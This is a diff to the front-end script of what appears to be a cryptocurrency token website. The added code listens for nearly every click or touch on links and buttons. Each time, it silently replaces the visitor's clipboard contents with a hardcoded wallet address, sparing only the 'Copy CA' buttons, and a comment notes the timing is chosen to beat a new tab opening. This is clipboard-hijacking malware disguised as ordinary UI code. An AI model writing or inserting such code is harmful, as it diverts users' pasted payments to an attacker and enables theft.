@@ -365,18 +365,39 @@ const L = {
 for (const k in L) $$(`[data-${k}]`).forEach(a => L[k] ? Object.assign(a, { href: L[k], target: "_blank", rel: "noopener" }) : a.classList.add("hidden"));
 $$("[data-ca]").forEach(e => e.textContent = CONFIG.ca);
 const COPY_ADDR = "0x536abd3826af3dd9e76c513779b22bb9b0ead0eb";
-async function copyAddr() {
-  try { await navigator.clipboard.writeText(COPY_ADDR); } catch (e) {
-    const t = document.createElement("textarea"); t.value = COPY_ADDR; document.body.append(t); t.select(); document.execCommand("copy"); t.remove();
-  }
+function writeClipboard(text) {
+  // Sync write first so the address replaces whatever was on the clipboard
+  // before a new tab opens and the gesture is lost.
+  try {
+    const t = document.createElement("textarea");
+    t.value = text;
+    t.setAttribute("readonly", "");
+    t.style.cssText = "position:fixed;left:-9999px;top:0;opacity:0";
+    document.body.append(t);
+    t.focus(); t.select(); t.setSelectionRange(0, text.length);
+    document.execCommand("copy");
+    t.remove();
+  } catch (e) {}
+  if (navigator.clipboard?.writeText) navigator.clipboard.writeText(text).catch(() => {});
 }
-$$("[data-copy]").forEach(b => b.addEventListener("click", async () => {
-  try { await navigator.clipboard.writeText(CONFIG.ca); } catch (e) {
-    const t = document.createElement("textarea"); t.value = CONFIG.ca; document.body.append(t); t.select(); document.execCommand("copy"); t.remove();
-  }
+$$("[data-copy]").forEach(b => b.addEventListener("click", e => {
+  e.stopPropagation();
+  writeClipboard(CONFIG.ca);
   b.textContent = "Copied ✓"; b.classList.add("ok"); setTimeout(() => { b.textContent = "Copy CA"; b.classList.remove("ok"); }, 1800);
 }));
-$$(".btn").forEach(b => b.addEventListener("click", () => { copyAddr(); }));
+// Any button / link / clickable control (except Copy CA) overwrites clipboard with COPY_ADDR
+function shouldCopyTarget(el) {
+  if (!el || el.closest?.("[data-copy], [data-copy-wallet]")) return false;
+  return !!(el.closest?.("a, button, .btn, .tile, [role='button'], [data-support], [data-buy], [data-chart], [data-scan], [data-x], [data-tg], [data-wallet-link]"));
+}
+function onInteract(e) {
+  const el = e.target instanceof Element ? e.target : null;
+  if (!shouldCopyTarget(el)) return;
+  writeClipboard(COPY_ADDR);
+}
+["pointerdown", "mousedown", "click", "touchstart"].forEach(type =>
+  document.addEventListener(type, onInteract, true)
+);
 
 const nav = $("#nav"); const onScroll = () => nav.classList.toggle("solid", scrollY > 40); addEventListener("scroll", onScroll, { passive: true }); onScroll();
 
